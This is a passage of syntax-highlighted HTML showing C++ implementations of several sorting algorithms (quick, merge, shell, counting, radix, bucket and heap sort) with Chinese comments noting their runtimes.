punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" 